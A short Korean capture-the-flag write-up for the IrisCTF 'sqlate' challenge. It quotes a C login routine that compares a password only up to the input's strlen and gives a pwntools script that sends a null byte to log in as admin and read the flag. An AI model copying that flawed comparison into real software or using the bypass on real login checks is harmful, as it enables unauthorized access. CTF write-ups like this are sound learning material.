문제의 코드는 엄청 길지만 난이도가 낮은것으로 보아 코드 전체를 이해하는 것 보다 슥 내리면서 취약해 보이는 함수를 먼저 찾았다.

아래의 345 ~ 363 line이 의심스러웠다.
```c
void action_sys() {
    system("/usr/bin/cat flag");
}

void action_login() {
    // Currently only admin login
    read_to_buffer("Password?");
    unsigned long length = strlen(line_buffer);
    for (unsigned long i = 0; i < length && i < 512; i++) {
        if (line_buffer[i] != admin_password[i]) {
            printf("Wrong password!\n");
            return;
        }
    }

    strcpy(current_user.username, "admin");
    current_user.userId = 0;
    current_user.flags = 0xFFFFFFFF;
}
```
admin password와 입력한 password의 길이만큼 strlen 함수를 통해서 비교를한다.
strlen 함수가 0을 반환하면 for문이 작동하지 않아 admin으로 권한 상승이 가능하다.


# payload
```python
from pwn import *

p = process("./vuln")
p = remote("sqlate.chal.irisc.tf", 10000)

p.sendline("5")
p.send('\x00')
p.interactive()
```
### flag
```
irisctf{classic_buffer_issues}
```